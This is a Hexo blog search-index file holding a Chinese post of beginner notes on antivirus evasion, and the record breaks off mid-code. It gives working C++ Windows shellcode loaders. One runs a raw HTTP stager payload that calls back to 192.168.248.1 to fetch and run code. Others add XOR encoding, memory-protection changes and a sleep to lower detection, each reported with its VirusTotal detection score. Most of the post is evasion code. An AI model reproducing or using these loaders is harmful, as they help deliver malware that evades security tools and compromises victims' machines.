<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>菜鸡的0基础免杀学习记录</title>
      <link href="2021/12/02/%E8%8F%9C%E9%B8%A1%E7%9A%840%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>2021/12/02/%E8%8F%9C%E9%B8%A1%E7%9A%840%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言</p><p>其实一直对免杀挺感兴趣的，但一直没有下定决心系统的学习，只是半路拿来别人写的过来用一下，所以这次想从最基本的方法开始学习免杀，作为一个记录贴将持续更新免杀方法、代码以及其中我没掌握的知识点。</p></blockquote><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://hack-for.fun/bd13.html">https://hack-for.fun/bd13.html</a></p><h1 id="windows-API-源码函数学习"><a href="#windows-API-源码函数学习" class="headerlink" title="windows API/源码函数学习"></a>windows API/源码函数学习</h1><h2 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAlloc(</span><br><span class="line">  LPVOID lpAddress,内存基址</span><br><span class="line">  SIZE_T dwSize,大小</span><br><span class="line">  DWORD  flAllocationType,分配的类型</span><br><span class="line">  DWORD  flProtect 该内存的初始保护属性 RWX？</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h1 id="最简单直接加载shellcode"><a href="#最简单直接加载shellcode" class="headerlink" title="最简单直接加载shellcode"></a>最简单直接加载shellcode</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="comment">/* length: 892 bytes */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4f\x69\x42\x63\x00\x3b\xba\x07\xca\x0e\x71\x39\x4d\xf4\x73\xa0\x65\x60\xbc\x40\x25\xa0\x17\x51\xb3\xcc\xe5\x79\x2f\xfb\x20\x19\xa8\x1a\x58\x78\x64\x4e\xf7\x12\xef\x1d\x0e\xec\xe1\xf5\x65\x17\xc5\x2f\xe7\x82\xbb\x5e\x99\xa3\x50\x8b\x24\x8b\x9c\xf6\x14\xeb\x83\x4d\x85\x05\x85\x88\xf3\x0c\x81\xb1\x6a\x5a\x7d\x7b\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x53\x4c\x43\x43\x32\x3b\x20\x2e\x4e\x45\x54\x20\x43\x4c\x52\x20\x32\x2e\x30\x2e\x35\x30\x37\x32\x37\x29\x0d\x0a\x00\x69\x9b\xe0\x7e\xb2\xb6\x38\x6a\xbc\x63\x5e\xf9\x85\x9c\x22\x64\x17\x40\x5a\x37\x76\xe0\x60\x04\x54\xf3\x6a\x65\x0b\x6e\x1e\x90\x87\xb9\xeb\xf9\x85\x0b\x22\xd7\x64\x40\x7c\x76\x54\xd6\x27\x7c\x18\x2c\x97\x47\x5d\x0c\x53\x8e\xc8\xec\xcc\x00\xde\xfd\xe8\x67\x80\xbb\xe5\xc6\x61\x14\x13\x3c\x21\x4e\x06\xf9\xd9\x21\xa7\x9d\x4e\x63\xc8\x3b\xae\x6e\xf2\xe3\x58\x29\x14\x9a\xb1\xec\xdd\xc6\xe4\x62\xd0\x21\x7c\xe4\xcf\x21\x51\xfd\x16\x7f\xcd\xfe\x68\xdc\xda\x17\x1c\xf7\xab\x35\x79\x45\x31\x17\xf1\x30\xfd\xdd\x4f\xfd\x35\xcf\x94\xaa\xbd\xcb\x13\x48\xd3\xa5\x2f\xb8\x98\xed\x65\x54\x18\x35\xb2\x3c\x23\x1b\x8d\xb4\x0d\x62\xcf\xe1\x9b\x7b\xe7\x63\x2a\x86\x8d\x16\xe4\xda\xfb\xa4\x03\x4b\x8e\x1e\x03\x03\xa3\x4d\x11\x1d\x2a\xbb\xc9\xe1\xbf\xb0\xa5\x23\x0d\xd6\x6d\x34\x99\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x34\x38\x2e\x31\x00\x51\x09\xbf\x6d&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">    shellcode_size = <span class="built_in"><span class="keyword">sizeof</span></span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line"></span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="免杀效果-vt-21-65"><a href="#免杀效果-vt-21-65" class="headerlink" title="免杀效果 vt 21/65"></a>免杀效果 vt 21/65</h2><p>59b33f3b4a74e8930a5207bf209f961f45e5eef277c19553c8c5ad3fe203c20d</p><p><img src="http://cdn.polowong.top/image-20211129152638091.png" alt="image-20211129152638091"></p><h1 id="简单加载器-shellcode-XOR"><a href="#简单加载器-shellcode-XOR" class="headerlink" title="简单加载器+shellcode XOR"></a>简单加载器+shellcode XOR</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xed\x59\x92\xf5\xe1\xf9\xd9\x11\x11\x11\x50\x40\x50\x41\x43\x40\x47\x59\x20\xc3\x74\x59\x9a\x43\x71\x59\x9a\x43\x09\x59\x9a\x43\x31\x59\x9a\x63\x41\x59\x1e\xa6\x5b\x5b\x5c\x20\xd8\x59\x20\xd1\xbd\x2d\x70\x6d\x13\x3d\x31\x50\xd0\xd8\x1c\x50\x10\xd0\xf3\xfc\x43\x50\x40\x59\x9a\x43\x31\x9a\x53\x2d\x59\x10\xc1\x77\x90\x69\x09\x1a\x13\x64\x63\x9a\x91\x99\x11\x11\x11\x59\x94\xd1\x65\x76\x59\x10\xc1\x41\x9a\x59\x09\x55\x9a\x51\x31\x58\x10\xc1\xf2\x47\x59\xee\xd8\x50\x9a\x25\x99\x59\x10\xc7\x5c\x20\xd8\x59\x20\xd1\xbd\x50\xd0\xd8\x1c\x50\x10\xd0\x29\xf1\x64\xe0\x5d\x12\x5d\x35\x19\x54\x28\xc0\x64\xc9\x49\x55\x9a\x51\x35\x58\x10\xc1\x77\x50\x9a\x1d\x59\x55\x9a\x51\x0d\x58\x10\xc1\x50\x9a\x15\x99\x59\x10\xc1\x50\x49\x50\x49\x4f\x48\x4b\x50\x49\x50\x48\x50\x4b\x59\x92\xfd\x31\x50\x43\xee\xf1\x49\x50\x48\x4b\x59\x9a\x03\xf8\x5e\xee\xee\xee\x4c\x7b\x11\x58\xaf\x66\x78\x7f\x78\x7f\x74\x65\x11\x50\x47\x58\x98\xf7\x5d\x98\xe0\x50\xab\x5d\x66\x37\x16\xee\xc4\x59\x20\xd8\x59\x20\xc3\x5c\x20\xd1\x5c\x20\xd8\x50\x41\x50\x41\x50\xab\x2b\x47\x68\xb6\xee\xc4\xfa\x62\x4b\x59\x98\xd0\x50\xa9\x41\x11\x11\x11\x5c\x20\xd8\x50\x40\x50\x40\x7b\x12\x50\x40\x50\xab\x46\x98\x8e\xd7\xee\xc4\xfa\x48\x4a\x59\x98\xd0\x59\x20\xc3\x58\x98\xc9\x5c\x20\xd8\x43\x79\x11\x13\x51\x95\x43\x43\x50\xab\xfa\x44\x3f\x2a\xee\xc4\x59\x98\xd7\x59\x92\xd2\x41\x7b\x1b\x4e\x59\x98\xe0\x59\x98\xcb\x58\xd6\xd1\xee\xee\xee\xee\x5c\x20\xd8\x43\x43\x50\xab\x3c\x17\x09\x6a\xee\xc4\x94\xd1\x1e\x94\x8c\x10\x11\x11\x59\xee\xde\x1e\x95\x9d\x10\x11\x11\xfa\xc2\xf8\xf5\x10\x11\x11\xf9\xb3\xee\xee\xee\x3e\x5e\x78\x53\x72\x11\x2a\xab\x16\xdb\x1f\x60\x28\x5c\xe5\x62\xb1\x74\x71\xad\x51\x34\xb1\x06\x40\xa2\xdd\xf4\x68\x3e\xea\x31\x08\xb9\x0b\x49\x69\x75\x5f\xe6\x03\xfe\x0c\x1f\xfd\xf0\xe4\x74\x06\xd4\x3e\xf6\x93\xaa\x4f\x88\xb2\x41\x9a\x35\x9a\x8d\xe7\x05\xfa\x92\x5c\x94\x14\x94\x99\xe2\x1d\x90\xa0\x7b\x4b\x6c\x6a\x11\x44\x62\x74\x63\x3c\x50\x76\x74\x7f\x65\x2b\x31\x5c\x7e\x6b\x78\x7d\x7d\x70\x3e\x25\x3f\x21\x31\x39\x72\x7e\x7c\x61\x70\x65\x78\x73\x7d\x74\x2a\x31\x5c\x42\x58\x54\x31\x29\x3f\x21\x2a\x31\x46\x78\x7f\x75\x7e\x66\x62\x31\x5f\x45\x31\x27\x3f\x20\x2a\x31\x46\x5e\x46\x27\x25\x2a\x31\x45\x63\x78\x75\x74\x7f\x65\x3e\x25\x3f\x21\x2a\x31\x42\x5d\x52\x52\x23\x2a\x31\x3f\x5f\x54\x45\x31\x52\x5d\x43\x31\x23\x3f\x21\x3f\x24\x21\x26\x23\x26\x38\x1c\x1b\x11\x78\x8a\xf1\x6f\xa3\xa7\x29\x7b\xad\x72\x4f\xe8\x94\x8d\x33\x75\x06\x51\x4b\x26\x67\xf1\x71\x15\x45\xe2\x7b\x74\x1a\x7f\x0f\x81\x96\xa8\xfa\xe8\x94\x1a\x33\xc6\x75\x51\x6d\x67\x45\xc7\x36\x6d\x09\x3d\x86\x56\x4c\x1d\x42\x9f\xd9\xfd\xdd\x11\xcf\xec\xf9\x76\x91\xaa\xf4\xd7\x70\x05\x02\x2d\x30\x5f\x17\xe8\xc8\x30\xb6\x8c\x5f\x72\xd9\x2a\xbf\x7f\xe3\xf2\x49\x38\x05\x8b\xa0\xfd\xcc\xd7\xf5\x73\xc1\x30\x6d\xf5\xde\x30\x40\xec\x07\x6e\xdc\xef\x79\xcd\xcb\x06\x0d\xe6\xba\x24\x68\x54\x20\x06\xe0\x21\xec\xcc\x5e\xec\x24\xde\x85\xbb\xac\xda\x02\x59\xc2\xb4\x3e\xa9\x89\xfc\x74\x45\x09\x24\xa3\x2d\x32\x0a\x9c\xa5\x1c\x73\xde\xf0\x8a\x6a\xf6\x72\x3b\x97\x9c\x07\xf5\xcb\xea\xb5\x12\x5a\x9f\x0f\x12\x12\xb2\x5c\x00\x0c\x3b\xaa\xd8\xf0\xae\xa1\xb4\x32\x1c\xc7\x7c\x25\x88\x11\x50\xaf\xe1\xa4\xb3\x47\xee\xc4\x59\x20\xd8\xab\x11\x11\x51\x11\x50\xa9\x11\x01\x11\x11\x50\xa8\x51\x11\x11\x11\x50\xab\x49\xb5\x42\xf4\xee\xc4\x59\x82\x42\x42\x59\x98\xf6\x59\x98\xe0\x59\x98\xcb\x50\xa9\x11\x31\x11\x11\x58\x98\xe8\x50\xab\x03\x87\x98\xf3\xee\xc4\x59\x92\xd5\x31\x94\xd1\x65\xa7\x77\x9a\x16\x59\x10\xd2\x94\xd1\x64\xc6\x49\x49\x49\x59\x14\x11\x11\x11\x11\x41\xd2\xf9\x8e\xec\xee\xee\x20\x28\x23\x3f\x20\x27\x29\x3f\x23\x25\x29\x3f\x20\x11\x40\x18\xae\x7c\x11&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">     shellcode_size = <span class="built_in"><span class="keyword">sizeof</span></span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//shellcode xor后解密，密码为17,解密后使用virtualalloc分配虚拟内存</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i] = buf[i] ^ <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line"></span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="免杀效果-vt14-62"><a href="#免杀效果-vt14-62" class="headerlink" title="免杀效果  vt14/62"></a>免杀效果  vt14/62</h2><p>ac7eea68dbdf30730fb38ac43d0671c88aacdbcb7b8289740d69e8208923b2df</p><p><img src="http://cdn.polowong.top/image-20211202152221587.png" alt="image-20211202152221587"></p><h1 id="简单加载器-修改内存页属性-sleep-shellcode-xor异或"><a href="#简单加载器-修改内存页属性-sleep-shellcode-xor异或" class="headerlink" title="简单加载器+修改内存页属性+sleep+shellcode xor异或"></a>简单加载器+修改内存页属性+sleep+shellcode xor异或</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xed\x59\x92\xf5\xe1\xf9\xd9\x11\x11\x11\x50\x40\x50\x41\x43\x40\x47\x59\x20\xc3\x74\x59\x9a\x43\x71\x59\x9a\x43\x09\x59\x9a\x43\x31\x59\x9a\x63\x41\x59\x1e\xa6\x5b\x5b\x5c\x20\xd8\x59\x20\xd1\xbd\x2d\x70\x6d\x13\x3d\x31\x50\xd0\xd8\x1c\x50\x10\xd0\xf3\xfc\x43\x50\x40\x59\x9a\x43\x31\x9a\x53\x2d\x59\x10\xc1\x77\x90\x69\x09\x1a\x13\x64\x63\x9a\x91\x99\x11\x11\x11\x59\x94\xd1\x65\x76\x59\x10\xc1\x41\x9a\x59\x09\x55\x9a\x51\x31\x58\x10\xc1\xf2\x47\x59\xee\xd8\x50\x9a\x25\x99\x59\x10\xc7\x5c\x20\xd8\x59\x20\xd1\xbd\x50\xd0\xd8\x1c\x50\x10\xd0\x29\xf1\x64\xe0\x5d\x12\x5d\x35\x19\x54\x28\xc0\x64\xc9\x49\x55\x9a\x51\x35\x58\x10\xc1\x77\x50\x9a\x1d\x59\x55\x9a\x51\x0d\x58\x10\xc1\x50\x9a\x15\x99\x59\x10\xc1\x50\x49\x50\x49\x4f\x48\x4b\x50\x49\x50\x48\x50\x4b\x59\x92\xfd\x31\x50\x43\xee\xf1\x49\x50\x48\x4b\x59\x9a\x03\xf8\x5e\xee\xee\xee\x4c\x7b\x11\x58\xaf\x66\x78\x7f\x78\x7f\x74\x65\x11\x50\x47\x58\x98\xf7\x5d\x98\xe0\x50\xab\x5d\x66\x37\x16\xee\xc4\x59\x20\xd8\x59\x20\xc3\x5c\x20\xd1\x5c\x20\xd8\x50\x41\x50\x41\x50\xab\x2b\x47\x68\xb6\xee\xc4\xfa\x62\x4b\x59\x98\xd0\x50\xa9\x41\x11\x11\x11\x5c\x20\xd8\x50\x40\x50\x40\x7b\x12\x50\x40\x50\xab\x46\x98\x8e\xd7\xee\xc4\xfa\x48\x4a\x59\x98\xd0\x59\x20\xc3\x58\x98\xc9\x5c\x20\xd8\x43\x79\x11\x13\x51\x95\x43\x43\x50\xab\xfa\x44\x3f\x2a\xee\xc4\x59\x98\xd7\x59\x92\xd2\x41\x7b\x1b\x4e\x59\x98\xe0\x59\x98\xcb\x58\xd6\xd1\xee\xee\xee\xee\x5c\x20\xd8\x43\x43\x50\xab\x3c\x17\x09\x6a\xee\xc4\x94\xd1\x1e\x94\x8c\x10\x11\x11\x59\xee\xde\x1e\x95\x9d\x10\x11\x11\xfa\xc2\xf8\xf5\x10\x11\x11\xf9\xb3\xee\xee\xee\x3e\x5e\x78\x53\x72\x11\x2a\xab\x16\xdb\x1f\x60\x28\x5c\xe5\x62\xb1\x74\x71\xad\x51\x34\xb1\x06\x40\xa2\xdd\xf4\x68\x3e\xea\x31\x08\xb9\x0b\x49\x69\x75\x5f\xe6\x03\xfe\x0c\x1f\xfd\xf0\xe4\x74\x06\xd4\x3e\xf6\x93\xaa\x4f\x88\xb2\x41\x9a\x35\x9a\x8d\xe7\x05\xfa\x92\x5c\x94\x14\x94\x99\xe2\x1d\x90\xa0\x7b\x4b\x6c\x6a\x11\x44\x62\x74\x63\x3c\x50\x76\x74\x7f\x65\x2b\x31\x5c\x7e\x6b\x78\x7d\x7d\x70\x3e\x25\x3f\x21\x31\x39\x72\x7e\x7c\x61\x70\x65\x78\x73\x7d\x74\x2a\x31\x5c\x42\x58\x54\x31\x29\x3f\x21\x2a\x31\x46\x78\x7f\x75\x7e\x66\x62\x31\x5f\x45\x31\x27\x3f\x20\x2a\x31\x46\x5e\x46\x27\x25\x2a\x31\x45\x63\x78\x75\x74\x7f\x65\x3e\x25\x3f\x21\x2a\x31\x42\x5d\x52\x52\x23\x2a\x31\x3f\x5f\x54\x45\x31\x52\x5d\x43\x31\x23\x3f\x21\x3f\x24\x21\x26\x23\x26\x38\x1c\x1b\x11\x78\x8a\xf1\x6f\xa3\xa7\x29\x7b\x